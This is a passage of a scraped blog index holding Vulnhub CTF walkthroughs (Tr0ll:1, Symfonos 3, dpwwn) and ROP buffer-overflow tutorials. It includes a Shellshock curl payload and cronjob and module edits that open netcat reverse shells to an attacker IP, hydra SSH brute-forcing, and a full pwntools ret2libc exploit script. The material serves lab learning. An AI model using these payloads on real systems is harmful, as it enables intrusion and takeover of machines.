network/machine that was our real target and it teaches you about how reconnaisance can often lead you to the vulnerable machine in a network.","title":"Vulnhub - Tempus Fugit"},{"content":"Today, we are going to pwn Troll:1 from Vulnhub by maleus.\nNmap #Running a nmap scan on the machine for analysing the services running on the machine. Doing that so, nmap -sV -sC -A -p- -T5 102.168.43.169 FTP Enumeration #From our nmap scan we knew that it FTP has Anonymous login enabled, so using ftp package we log in to ftp as anonymous user and found there was a lol.pcap.\nOpening it in wireshark, we can see there is a secret_txt somewhat existed in a network from where this traffic was captured. So I tried to follow the TCP stream and found that there is a directory mentioned in that specific file.\nHTTP Service Enumeration #Beforehand, I tried checking robots.txt and found out that we have been trolled again from the mentioned /secret page like the index page.\nRobots.txt\u0026rsquo;s content:-\nUser-agent:* Disallow: /secret From that pcap file we founded a directory reference so let\u0026rsquo;s try it,that directory listing from the web I found that there is a binary and it was 32 Bit ELF, running it shows the following string:-\nrobin@oracle:~/Vulnhub/Tr0ll$ ./roflmao Find address 0x0856BF to proceed That was a directory reference, going over there I found 2 more directories. The good_luck directory has which_one_lol.txt having following data:-\nmaleus ps-aux felux Eagle11 genphlux \u0026lt; -- Definitely not this one usmc8892 blawrg wytshadow vis1t0r overflow Other one has a text file named Pass.txt which says Good_luck:-).\nSSH Login and Root Flag #Using hydra to craft a dictionary attack. since at this point it was way too clear. Now, I tried doing th attack with hydra -L new.txt -P pass.txt 192.168.43.169 ssh which was giving a error, I had no idea what is happening sice the machine involved some trolling for the users, aftering spending 15 minutes on the argument being provided to the hydra, I tried hydra -L user.txt -p Pass.txt 192.168.43.169 ssh which gave us the password Pass.txt for user overflow, oh god that was definitely a good troll.\nNow, there are some commands I usually run in order to find anything interesting, so while trying them, I found the linux kernel is way too old usingg uname -a which in our case seems exploitabe. Using this exploit, I downloaded it on my host machine and started a local HTTP server via python -m SimpleHTTPServer 1337 in order to transfer te file to the machine. Now, I checked whether the machine has gcc installed or not and to our surprise it does. Now,let\u0026rsquo;s compile and run it already. Using gcc -o root root.c since I renamed that file to root.c. Running that exploit gave us root shell.\nThe Flag #Time to get flag:-\nThat was it, until then enjoy.\nFun #While enumerating the system I found lamo.py in /opt folder which was the cause of our automatic connection close because of timing constraints. Here, it\u0026rsquo;s content:-\nJust after checking it, I got disconnected.\n","date":"24 August 2019","permalink":"/posts/troll1/","section":"Posts","summary":"Today, we are going to pwn Troll:1 from Vulnhub by maleus.\nNmap #Running a nmap scan on the machine for analysing the services running on the machine.","title":"Vulnhub - Tr0ll:1"},{"content":"This is a walkthrough of Symfonos 3 which is 3rd machine in Symfonos series.\nNmap #Let\u0026rsquo;s scan the network and start working on the machine right away. Using nmap -sV -sC -A -p- -T5 192.168.43.22 shows that we have FTP, SSH and HTTP.\nHTTP Enumeration #This was kind of time consuming since it involves lots of nested directory busting, I mostly use gobutser so with some bash scripting I automated the scan by updating the script with every finding. My strategy for that was to copy every dictionary/wordlists into a single directory and using the bash we used it to find the directories. I used dirbuster and dirb wordlists only.\n#!/bin/sh for i in $(pwd)/*.txt; do gobuster dir -u http://192.168.43.22 -w \u0026#34;$i\u0026#34; | grep Status: done First, I found gate, then cerberus after that tartarus. After that I tried again with the script this time we got more than 4 hits:-\n=============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://192.168.43.22/gate/cerberus/tartarus/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/08/04 01:28:56 Starting gobuster =============================================================== /.htaccess (Status: 403) /.htpasswd (Status: 403) /charon (Status: 301) /hermes (Status: 301) /research (Status: 200) =============================================================== But somehow research was a rabbit hole, perhaps a wild goose chase for us. Then, I tried again with cgi-bin from previous findings. Now directory busting to the http://192.168.43.22/cgi-bin, I found a hit at underworld. PS: In case you don\u0026rsquo;t know about greek mythology, underworld is home of the god Hades.\n#!/bin/sh for i in $(pwd)/*.txt; do gobuster dir -u http://192.168.43.22/cgi-bin -w \u0026#34;$i\u0026#34; | grep Status: done root@kali:/usr/share/wordlists/dirb# ./new.sh /.htaccess (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /.hta (Status: 403) /underworld (Status: 200)\nThere, we got the underworld, the real game begins from here.\nReverse Shell and FTP Network Sniffing #From that page we can see that it\u0026rsquo;s saying uptime, I tried to enumerate more but somehow none worked. I switched to some research on similar machines to get information about this thinking that it might have been some kind of task of a machine. From that I found a machine from PentesterLab which has kind of vulnerability but after checking it I was confirmed that it was same. The vulnerability is named ShellShock. In this type of vulnerablity you have the pass the bash command as a User-Agent for that particular request. So, using the following command with the help of curl, we get a reverse shell on our host machine.\nrobin@oracle:~$ curl -A \u0026#34;() { :; }; /bin/bash -c \u0026#39;nc 192.168.43.243 1337 -e /bin/sh\u0026#39;\u0026#34; http://192.168.43.22/cgi-bin/underworld Once, we get reverse shell I found out we have privilge of cerberus, so from some basc enumeration I didn\u0026rsquo;t found anything so I thought of using the pspy script which is useful for tracing the background proccesses. Using pspy after using wget to grab it from server I found out there is a ftp server is running in the background. I thought of checking the directory too but permission denied. Now, I started grabbing the network dump using tcpdump since it ws available for usage, using tcpdump -w ftplog.pcap -i lo, the FTP server was runiing on the lo interface because the other one has our reverse shell connected to using shellshock. SInce, I first grabbed the en0ps17 but I saw that our curl is making request to server.\nWarning: Let the tcpdump run for 5-10 minutes so you can grab enough data to analyse.\nI saved the file in /tmp folder and started a HTTP server using python python -m SimpleHTTPServer 1234 and grabbed the ftplog.pcap right away from http://192.168.43.22:1234.\nAfter opening it in wireshark and filtering out the packets for FTP only with tcp.port == 21, I got some packets with FTP service and following TCP Stream of that packet I found the user hades password.\nRoot #Once you SSH into the system as user hades with the above password you\u0026rsquo;ll find out that we have the same thing as user cerberus. So, the last option was to run the pspy again, doing that so I found that we have nothing more nothing less than previous scan. I started trying again in ftpclient, this time we can access the folder which has a python script which is running the server by the root itself. So, there is more to see than meets the eye.\nAfter analysing the script I found that script is using a module named ftplib.py in /opt/ftpclient which is running as root, as from my previous experience I thought that we need to edit the module file itself to get root privilges or anything to get moving. I checked permission and it turns out we can edit it since the user hades ia belong to group gods.\nNow, I added a line os.system(\u0026quot;nc 192.168.43.243 4444 -e /bin/bash) in the file so that once the script will be run our reverse shell gets executed giving a root shell. So, once done I started my listener and start analysing the process again, once that script runs we have the shell as root. Hence, the flag.\nThanks to @zayotic for making this wonderful machine.\n","date":"4 August 2019","permalink":"/posts/symfonos3-writeup/","section":"Posts","summary":"This is a walkthrough of Symfonos 3 which is 3rd machine in Symfonos series.\nNmap #Let\u0026rsquo;s scan the network and start working on the machine right away.","title":"Vulnhub - Symfonos 3"},{"content":"Writeup for VulnHub\u0026rsquo;s Dpwwn machine.\nNmap #Starting off with the nmap, using nmap -sV -sC -A 192.168.43.59 shows us that 22, 80 and 3306 i.e. SSH, HTTP, MySQL are open respectively.\nHTTP and MySQL Enumeration #I fired up the gobuster and while it was running I tried to check that HTTP server and the source in order to find something useful but somehow it\u0026rsquo;s not relevant in any way and the gobuster has only given /info.php which as also not useful. So I tried MySQL service, using mysql -h 192,168.43.59 -u root which logged us into the mysql service of the machine. Using SHOW DATABASES; shows us that we have a database named ssh, selecting that database with USE ssh which has a table named users which can be seen by providing the command SHOW TABLES; and finally using SELECT * FROM users shows us that user and it\u0026rsquo;s corresponding password which was mistic:testP@$$swordmistic.\nSSH Login and Root Flag #Using the credentials we found above, we logged into the ssh as user mistic.\nFor the root, it was easy since the working directory of user mistic has a file logrot.sh which was a cronjob runs by the root and was collecting logs. Checking the permission we can see that it can be edited by the user mistic so using vi logrot.sh and changing the mode to the input I entered the follwoing data whch will spawn the root shell as reverse callback due to that cronjob running.\n[mistic@dpwwn-01 ~]$ cat logrot.sh #!/bin/bash nc -e /bin/bash 192.168.43.243 1234 Hence, spawning the root shell.\nRoot flag #Well, all the way down here for the flag:-\n","date":"1 August 2019","permalink":"/posts/dpwwn/","section":"Posts","summary":"Writeup for VulnHub\u0026rsquo;s Dpwwn machine.\nNmap #Starting off with the nmap, using nmap -sV -sC -A 192.168.43.59 shows us that 22, 80 and 3306 i.e. SSH, HTTP, MySQL are open respectively.","title":"Vulnhub - dpwnn1"},{"content":"Today, I will show you how to use Return Oriented Programming for doing a ret2libc attack.\nForeword #This is much more harder than what we encountered earlier, unlike before we won\u0026rsquo;t have any function preloaded with strings like /bin/cat flag.txt. It won\u0026rsquo;t even contain a system so we will use libc.so.6 to get the system and /bin/sh address to spawn a shell.\nWhat is Return-to-libc or ret2libc attack? #A \u0026ldquo;return-to-libc\u0026rdquo; attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, bypassing the no-execute bit feature (if present) and ridding the attacker of the need to inject their own code.\nReturning to libc is a method of exploiting a buffer overflow on a system that has a non-executable stack, it is very similar to a standard buffer overflow, in that the return address is changed to point at a new location that we can control. However since no executable code is allowed on the stack we can\u0026rsquo;t just tag in shellcode. This is the reason we use the return into libc trick and utilize a function provided by the library. We still overwrite the return address with one of a function in libc, pass it the correct arguments and have that execute for us. Since these functions do not reside on the stack, we can bypass the stack protection and execute code.\nBinary Analysis #Let\u0026rsquo;s try checksec bitterman and see what protections are enabled.\nArch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE NX is enabled that means we have a non executable stack, hence we need a ret2libc attack.Let\u0026rsquo;s load up the binary into radare2 and start analysing.\n0x0040077c bfc9084000 mov edi, str.Please_enter_your_text: ; .//main.c:23 ; 0x4008c9 ; \u0026#34;\u0026gt; Please enter your text: \u0026#34; ; const char * s | 0x00400781 e89afdffff call sym.imp.puts ; int puts(const char *s) | 0x00400786 488b050b0520. mov rax, qword [obj.stdout] ; loc.stdout ; [0x600c98:8]=0 | 0x0040078d 4889c7 mov rdi, rax ; FILE *stream | 0x00400790 e8dbfdffff call sym.imp.fflush ; int fflush(FILE *stream) | 0x00400795 488b9568ffff. mov rdx, qword [local_98h] ; .//main.c:24 ; size_t nbyte It uses puts that seems vulnerable? Can\u0026rsquo;t say much without checking. So, let\u0026rsquo;s use gdb-peda:-\ngdb-peda$ r Starting program: /home/robin/ROP-Emporium/bitterman \u0026gt; What\u0026#39;s your name? robin Hi, robin \u0026gt; Please input the length of your message: 512 \u0026gt; Please enter your text: **--pattern created--** Doing that, we get Program received signal SIGSEGV, Segmentation fault., look like the stack overflowed i.e. a buffer overflow. So, let\u0026rsquo;s continue analysing the stack and core that has been dumped.\n[----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x0 RCX: 0xb40 (\u0026#39;@\\x0b\u0026#39;) RDX: 0x0 RSI: 0x7ffff7dd18c0 --\u0026gt; 0x0 RDI: 0x7ffff7dd0760 --\u0026gt; 0xfbad2a84 RBP: 0x415341416f414152 (\u0026#39;RAAoAASA\u0026#39;) RSP: 0x7fffffffde48 (\u0026#34;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\n8\\255?\\004\\240\\034Ґ\\005@\u0026#34;) RIP: 0x4007e1 (\u0026lt;main+245\u0026gt;:\tret) R8 : 0x7ffff7dd18c0 --\u0026gt; 0x0 R9 : 0x7ffff7fdc4c0 (0x00007ffff7fdc4c0) R10: 0x7ffff7b82cc0 --\u0026gt; 0x2000200020002 R11: 0x246 R12: 0x400590 (\u0026lt;_start\u0026gt;:\txor ebp,ebp) R13: 0x7fffffffdf20 --\u0026gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x4007d6 \u0026lt;main+234\u0026gt;:\tcall 0x400570 \u0026lt;fflush@plt\u0026gt; 0x4007db \u0026lt;main+239\u0026gt;:\tmov eax,0x0 0x4007e0 \u0026lt;main+244\u0026gt;:\tleave =\u0026gt; 0x4007e1 \u0026lt;main+245\u0026gt;:\tret 0x4007e2:\tnop WORD PTR cs:[rax+rax*1+0x0] 0x4007ec:\tnop DWORD PTR [rax+0x0] 0x4007f0 \u0026lt;__libc_csu_init\u0026gt;:\tpush r15 0x4007f2 \u0026lt;__libc_csu_init+2\u0026gt;:\tpush r14 [------------------------------------stack-------------------------------------] 0000| 0x7fffffffde48 (\u0026#34;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\n8\\255?\\004\\240\\034Ґ\\005@\u0026#34;) 0008| 0x7fffffffde50 (\u0026#34;AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\n8\\255?\\004\\240\\034Ґ\\005@\u0026#34;) 0016| 0x7fffffffde58 (\u0026#34;VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\n8\\255?\\004\\240\\034Ґ\\005@\u0026#34;) 0024| 0x7fffffffde60 (\u0026#34;AuAAXAAvAAYAAwAAZAAxAAyA\\n8\\255?\\004\\240\\034Ґ\\005@\u0026#34;) 0032| 0x7fffffffde68 (\u0026#34;AAYAAwAAZAAxAAyA\\n8\\255?\\004\\240\\034Ґ\\005@\u0026#34;) 0040| 0x7fffffffde70 (\u0026#34;ZAAxAAyA\\n8\\255?\\004\\240\\034Ґ\\005@\u0026#34;) 0048| 0x7fffffffde78 --\u0026gt; 0xd21ca0043fad380a 0056| 0x7fffffffde80 --\u0026gt; 0x400590 (\u0026lt;_start\u0026gt;:\txor ebp,ebp) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x00000000004007e1 in main (argc=0x1, argv=0x7fffffffdf28) at main.c:28 28\tmain.c: No such file or directory. Look, at RSP register is full of our pattern, in 64-bit register we cant overwrite RIP straight away so let\u0026rsquo;s see our stack RSP, the Stack Pointer points to our input, we need to fix the return address and inject our code but for that we need to know where overflow occurs. Doing similar from what we did earlier let\u0026rsquo;s get started:-\ngdb-peda$ x/xg $rsp 0x7fffffffde48:\t0x7141415441417041 gdb-peda$ pattern offset 0x7141415441417041 8160875829899915329 found at offset: 152 x/xg : This loads the memory address of RSP register in hex format and in 64-bit format. pattern offset \u0026lt; value \u0026gt; : This shows after how many bytes the overflow occured. We get the overflow limit i.e. 152.\nStage 1: Leaking the address #First, as told earlier we need to get put address from the running process. First, we need leak address then we need to get the constant distance which means the offset for it after that we will get to execute our code.\nLet\u0026rsquo;s get puts using objdump -D bitterman | grep puts :-\n400520:\tff 25 2a 07 20 00 jmpq *0x20072a(%rip) # 600c50 \u0026lt;puts@GLIBC_2.2.5\u0026gt; As you can see we have one address at the left and one i the right. Let m clarify this:-\nPLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn\u0026rsquo;t known in the time of linking, and is left to be resolved by the dynamic linker at run time. GOT stands for Global Offsets Table and is similarly used to resolve addresses.The Global Offset Table (or GOT) is a section inside of programs that holds addresses of functions that are dynamically linked. As mentioned in the page on calling conventions, most programs don\u0026rsquo;t include every function they use to reduce binary size. Instead, common functions (like those in libc) are \u0026ldquo;linked\u0026rdquo; into the program so they can be saved once on disk and reused by every program.\nSo, we get the address of PLT and GOT puts i.e. 0x400520 and 0x600c50 respectively.\nThe Gadget #For finding a gadget, I will use radare2\u0026rsquo;s /R \u0026lt; instruction \u0026gt; command to find a pop rdi; ret; gadget.\n[0x00400590]\u0026gt; /R pop rdi 0x00400853 5f pop rdi 0x00400854 c3 ret Let\u0026rsquo;s copy the address i.e. 0x400853.\nLet\u0026rsquo;s make the exploit:-\nFirst off, we have pop_rdi gadget address and PLT and GOT puts address.\nfrom pwn import * # importing fuctions #context(terminal=[\u0026#39;gnome-terminal\u0026#39;,\u0026#39;new-window\u0026#39;]) Debug purpose #context.log_level = \u0026#39;DEBUG\u0026#39; # Debug purpose p = process(\u0026#39;./bitterman\u0026#39;) # using bitterman elf # processing the target elf #p = gdb.debug(\u0026#39;./bitterman\u0026#39;,\u0026#39;b main\u0026#39;) # breakpoint setup at main via gdb plt_put = p64(0x400520) # PLT put address got_put = p64(0x600c50) # GOT put address pop_rdi = p64(0x400853) # pop_rdi address padding = \u0026#34;A\u0026#34;*152 # Because we know the offset from earlier payload = padding + pop_rdi + got_put + plt_put p.recvuntil(\u0026#34;name?\u0026#34;) # recieve data until we recieve the string p.sendline(\u0026#34;robin\u0026#34;) # send data p.recvuntil(\u0026#34;message:\u0026#34;) # recieve data until we recieve the string p.sendline(\u0026#34;1024\u0026#34;) # send data p.recvuntil(\u0026#34;text:\u0026#34;) # recieve data until we recieve the string p.sendline(payload) # send data p.recvuntil(\u0026#34;Thanks!\u0026#34;) # recieve data until we recieve the string leaked_puts = p.recv()[:8].strip().ljust(8,\u0026#34;\\x00\u0026#34;) # recieving the string until we get leaked address and padding with null bytes to length of 8 log.success(\u0026#34;Leaked puts: %s\u0026#34; %(leaked_puts)) # Prints the leaked addresss p.interactive() # keeps the shell interactive This script pretty much explains everything with comments. So, let\u0026rsquo;s see what we get after running this:-\n[+] Starting local process \u0026#39;./bitterman\u0026#39;: pid 3117 [*] \u0026#39;/home/robin/ROP-Emporium/libc.so.6\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Leaked puts: ��E\\x92\\x87\\x7f\\x00\\x00 [*] Switching to interactive mode Great, we now have the leaked address, we need to find the offset which will be constant for every address. So, let\u0026rsquo;s start carfting our ret2libc attack.\nStage 2: Final Exploit using ret2libc #So, from the previous exploit we get the leaked address. Now we need to find the offset and execute the /bin/sh to spawn a shell.\nFirst off, we need main address because the leak address will be changed everytime so we need to get main address so we can use the leaked address to get the offset for current process. Using objdump -D bitterman | grep main, we will grab the address of the bitteman\u0026rsquo;s main.\n-snip-- 00000000004006ec \u0026lt;main\u0026gt;: --snip-- Nice, we have the main address. Let\u0026rsquo;s proceed further for crafting the exploit.\nWarning: Before we proceeds, we need the libc.so.6 of your machine. Copy it with cp //lib/x86_64-linux-gnu/libc.so.6 . , it willcopy thelibc.so.6 to the working directory.\nNow, we will automate the finding of addresses of put and system with pwntools but beforehand we need /bin/sh address as well. To find that, let\u0026rsquo;s use strings strings -a -t x libc.so.6 | grep /bin/sh , we will get the address of /bin/sh from the libc.so.6.\nLet\u0026rsquo;s make the exploit:-\n#!/usr/bin/python from pwn import * # importing fuctions #context(terminal=[\u0026#39;gnome-terminal\u0026#39;,\u0026#39;new-window\u0026#39;]) Debug purpose #context.log_level = \u0026#39;DEBUG\u0026#39; # Debug purpose p = process(\u0026#39;./bitterman\u0026#39;) # using bitterman elf # processing the target elf #p = gdb.debug(\u0026#39;./bitterman\u0026#39;,\u0026#39;b main\u0026#39;) # breakpoint setup at main via gdb libc = ELF(\u0026#39;libc.so.6\u0026#39;) plt_put = p64(0x400520) # PLT put address got_put = p64(0x600c50) # GOT put address pop_rdi = p64(0x400853) # pop_rdi address plt_main = p64(0x4006ec) padding = \u0026#34;A\u0026#34;*152 # Because we know the offset from earlier payload = padding + pop_rdi + got_put + plt_put + plt_main p.recvuntil(\u0026#34;name?\u0026#34;) # recieve data until we recieve the string p.sendline(\u0026#34;robin\u0026#34;) # send data p.recvuntil(\u0026#34;message:\u0026#34;) # recieve data until we recieve the string p.sendline(\u0026#34;1024\u0026#34;) # send data p.recvuntil(\u0026#34;text:\u0026#34;) # recieve data until we recieve the string p.sendline(payload) # send data p.recvuntil(\u0026#34;Thanks!\u0026#34;) # recieve data until we recieve the string leaked_puts = p.recv()[:8].strip().ljust(8,\u0026#34;\\x00\u0026#34;) # recieving the string until we get leaked address and padding with null bytes to length of 8 log.success(\u0026#34;Leaked puts: %s\u0026#34; %(leaked_puts)) # Prints the leaked addresss leaked_puts = u64(leaked_puts) # converts to 64-bit friendly integer offset = leaked_puts - libc.symbols[\u0026#39;puts\u0026#39;] # Ths sys = p64(offset + libc.symbols[\u0026#39;system\u0026#39;]) sh = p64(offset + 0x1b3e9a) payload = padding+ p64(0x0000000000400509) + pop_rdi + sh + sys # remove p64(0x0000000000400509) if you\u0026#39;re not using ubuntu p.sendline(\u0026#34;robin\u0026#34;) p.recvuntil(\u0026#34;message:\u0026#34;) p.sendline(\u0026#34;1024\u0026#34;) p.recvuntil(\u0026#34;text:\u0026#34;) p.sendline(payload) p.recvuntil(\u0026#34;Thanks!\u0026#34;) p.interactive() This will spawn a shell and hence you learned how to do a ret2libc attack. In a nutshell, we used the leak address to find the offset and hence using the gadget we overwrite the instruction pointer while calling the system and /bin/sh hence spawning a shell.\nrobin@oracle:~/ROP$ python exploit2.py [+] Starting local process \u0026#39;./bitterman\u0026#39;: pid 12562 [*] \u0026#39;/home/robin/ROP-Emporium/libc.so.6\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Leaked puts: ��3\\x84�\\x00 [*] Switching to interactive mode $ id uid=1000(robin) Final Words #Thanks to @Lord_Idiot for helping me out with the stack alignment issue.\nThe MOVAPS issue # If you\u0026rsquo;re using Ubuntu 18.04 and segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the 64 bit challenges then ensure the stack is 16 byte aligned before returning to GLIBC functions such as printf() and system(). The version of GLIBC packaged with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. The 64 bit calling convention requires the stack to be 16 byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.\nThat was it. Until then, pwn.\nFiles #Bitterman: https://github.com/ctfs/write-ups-2015/raw/master/camp-ctf-2015/pwn/bitterman-300/bitterman\n","date":"29 July 2019","permalink":"/posts/ret2libc-pwntools/","section":"Posts","summary":"Today, I will show you how to use Return Oriented Programming for doing a ret2libc attack.\nForeword #This is much more harder than what we encountered earlier, unlike before we won\u0026rsquo;t have any function preloaded with strings like /bin/cat flag.","title":"ROP - ret2libc attack"},{"content":"","date":null,"permalink":"/tags/rop-pwn-ret2libc-bof/","section":"Tags","summary":"","title":"Rop, Pwn, Ret2libc, Bof"},{"content":"This blog post will teach you basics of ROP i.e. how to use tools efficiently.\nOverview #This post is more practical, so tag along with radare2, pwntools, gdb and ropper ready. I\u0026rsquo;m using this binary from ROP-Emporium and it\u0026rsquo;s a basic one to start with. Grab it and read further.\nThe EIP and RIP Register #I\u0026rsquo;m starting off with IP register i.e. Instruction Pointer in 16-bit mode, Extended Instruction Pointer in 32-bit architecture and RIP in 64-bit. It contains the address of next instruction that will be executed hence, controlling the flow of command. Consider this register as something that will have the control of program flow since it has the next instruction which has to be executed.\nAnalysis of #Let\u0026rsquo;s run the binary and see what it says.\nrobin@oracle:~/ROP-Emporium$ ./ret2win ret2win by ROP Emporium 64bits For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer; What could possibly go wrong? You there madam, may I have your input please? And don\u0026#39;t worry about null bytes, we\u0026#39;re using fgets! \u0026gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Segmentation fault (core dumped) Using bunch of \u0026ldquo;As\u0026rdquo; we can see we got a segmentation fault that means we got a buffer overflow that means there is no bound checking. Let\u0026rsquo;s analyze the binary and see where is the input is overflowed.\nAs the first post contained radare2 as a resource for analysis of binary. Starting off with that, type rabin2 -I ret2win to get the information about the binary.\nrobin@oracle:~/ROP-Emporium$ rabin2 -I ret2win arch x86 binsz 7071 bintype elf bits 64 canary false class ELF64 crypto false endian little havecode true intrp /lib64/ld-linux-x86-64.so.2 lang c linenum true lsyms true machine AMD x86-64 architecture maxopsz 16 minopsz 1 nx true os linux pcalign 0 pic false relocs true relro partial rpath NONE static false stripped false subsys linux va true From above we now know that it\u0026rsquo;s x86 arcitercture and a 64-bit ELF and endianess is set to little. Now, let\u0026rsquo;s run r2 ret2win and see what functions it has.\nrobin@oracle:~/ROP-Emporium$ r2 ret2win [0x00400650]\u0026gt; aaaa [x] Analyze all flags starting with sym. and entry0 (aa) [x] Analyze len bytes of instructions for references (aar) [x] Analyze function calls (aac) [x] Emulate code to find computed references (aae) [x] Analyze consecutive function (aat) [x] Constructing a function name for fcn.* and sym.func.* functions (aan) [x] Type matching analysis for all functions (afta) [0x00400650]\u0026gt; afl 0x00400000 2 64 loc.imp.__gmon_start 0x00400041 1 171 fcn.00400041 0x004005a0 3 26 sym._init 0x004005d0 1 6 sym.imp.puts 0x004005e0 1 6 sym.imp.system 0x004005f0 1 6 sym.imp.printf 0x00400600 1 6 sym.imp.memset 0x00400610 1 6 sym.imp.__libc_start_main 0x00400620 1 6 sym.imp.fgets 0x00400630 1 6 sym.imp.setvbuf 0x00400640 1 6 sub.__gmon_start___248_640 0x00400650 1 41 entry0 0x00400680 4 50 -\u0026gt; 41 sym.deregister_tm_clones 0x004006c0 3 53 sym.register_tm_clones 0x00400700 3 28 sym.__do_global_dtors_aux 0x00400720 4 38 -\u0026gt; 35 entry1.init 0x00400746 1 111 sym.main 0x004007b5 1 92 sym.pwnme 0x00400811 1 32 sym.ret2win 0x00400840 4 101 sym.__libc_csu_init 0x004008b0 1 2 sym.__libc_csu_fini 0x004008b4 1 9 sym._fini [0x00400650]\u0026gt; So, we have a sym.ret2win, sym.pwnme and a sym.main which will be our focus for the rest. Since it\u0026rsquo;s a ROP challenge and checking the functions one by one with pdf @sym.ret2win in radare2 shell.\n[0x00400650]\u0026gt; pdf @sym.ret2win / (fcn) sym.ret2win 32 | sym.ret2win (); | 0x00400811 55 push rbp | 0x00400812 4889e5 mov rbp, rsp | 0x00400815 bfe0094000 mov edi, str.Thank_you__Here_s_your_flag: ; 0x4009e0 ; \u0026#34;Thank you! Here\u0026#39;s your flag:\u0026#34; ; const char * format | 0x0040081a b800000000 mov eax, 0 | 0x0040081f e8ccfdffff call sym.imp.printf ; int printf(const char *format) | 0x00400824 bffd094000 mov edi, str.bin_cat_flag.txt ; 0x4009fd ; \u0026#34;/bin/cat flag.txt\u0026#34; ; const char * string | 0x00400829 e8b2fdffff call sym.imp.system ; int system(const char *string) | 0x0040082e 90 nop | 0x0040082f 5d pop rbp \\ 0x00400830 c3 ret We see that there is a string with /bin/cat flag.txt and a system function call of C, in case you don\u0026rsquo;t know what system does, it executes the arguments as bash command.\nSince we want to jump to address 0x00400811 in order to execute above function which will print our flag. In order to execute this we need to find the offset that we need to overwrite the instruction pointer. In this case, it is a 64-bit ELF we have to find RIP if it was 32-bit ELF we had to find EIP. Let\u0026rsquo;s try to create a pattern offset uding gdb.\nrobin@oracle:~/ROP-Emporium$ gdb ret2win GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git Copyright (C) 2018 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details. This GDB was configured as \u0026#34;x86_64-linux-gnu\u0026#34;. Type \u0026#34;show configuration\u0026#34; for configuration details. For bug reporting instructions, please see: \u0026lt;http://www.gnu.org/software/gdb/bugs/\u0026gt;. Find the GDB manual and other documentation resources online at: \u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;. For help, type \u0026#34;help\u0026#34;. Type \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;... Reading symbols from ret2win...(no debugging symbols found)...done. gdb-peda$ pattern_create 100 \u0026#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\u0026#39; gdb-peda$ pattern_create 100 input Writing pattern of 100 chars to filename \u0026#34;input\u0026#34; gdb-peda$ r \u0026lt; input Starting program: /home/robin/ROP-Emporium/ret2win \u0026lt; input ret2win by ROP Emporium 64bits For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer; What could possibly go wrong? You there madam, may I have your input please? And don\u0026#39;t worry about null bytes, we\u0026#39;re using fgets! \u0026gt; Program received signal SIGSEGV, Segmentation fault. Command Explaination # gdb ret2win : This will open the gdb with ret2win binary for the processing. pattern_create 100 input : This will create a offset pattern of the length provided, in our case it\u0026rsquo;s 100. input is the file where the offset willbe written. r \u0026lt; input : This will run the binary ret2win and gives the input file as input. Analyzing the offsets #Let\u0026rsquo;s see the peda\u0026rsquo;s work and informatio it provided us:-\n[----------------------------------registers-----------------------------------] RAX: 0x7fffffffde10 (\u0026#34;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\u0026#34;) RBX: 0x0 RCX: 0x1f RDX: 0x7ffff7dd18d0 --\u0026gt; 0x0 RSI: 0x7fffffffde10 (\u0026#34;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\u0026#34;) RDI: 0x7fffffffde11 (\u0026#34;AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\u0026#34;) RBP: 0x6141414541412941 (\u0026#39;A)AAEAAa\u0026#39;) RSP: 0x7fffffffde38 (\u0026#34;AA0AAFAAb\u0026#34;) RIP: 0x400810 (\u0026lt;pwnme+91\u0026gt;:\tret) R8 : 0x0 R9 : 0x0 R10: 0x602010 --\u0026gt; 0x0 R11: 0x246 R12: 0x400650 